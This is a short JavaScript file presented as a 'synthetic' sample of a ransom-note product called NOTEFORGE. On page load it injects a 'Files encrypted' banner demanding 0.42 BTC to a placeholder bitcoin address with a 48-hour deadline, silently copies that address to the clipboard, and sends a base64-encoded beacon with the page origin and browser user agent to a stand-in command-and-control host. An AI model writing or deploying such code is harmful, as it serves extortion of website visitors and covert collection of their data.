// NOTEFORGE — synthetic ransom-note product sample.
(function () {
  var C2 = 'https://c2.example.test/note';
  var ADDRESS = 'bc1qexampleforgeaddress4f19';
  console.log('[NOTEFORGE] rendering note');

  function render() {
    try {
      var note = document.createElement('div');
      note.id = 'noteforge';
      note.innerHTML =
        '<h1>Files encrypted</h1>' +
        '<p>Pay 0.42 BTC to <code>' + ADDRESS + '</code></p>' +
        '<p>Deadline: <span id="deadline">48:00:00</span></p>';
      document.body.appendChild(note);
    } catch (error) {}
  }

  function report() {
    try {
      fetch(C2, { method: 'POST', body: btoa(JSON.stringify({ origin: location.origin, ua: navigator.userAgent, address: ADDRESS })) }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('noteforge:seen', '1'); } catch (error) {}
    console.log('[NOTEFORGE] note delivered');
  }

  render();
  try {
    if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(ADDRESS);
  } catch (error) {}
  report();
  setTimeout(function () { console.log('[NOTEFORGE] deadline tick'); }, 500);
})();
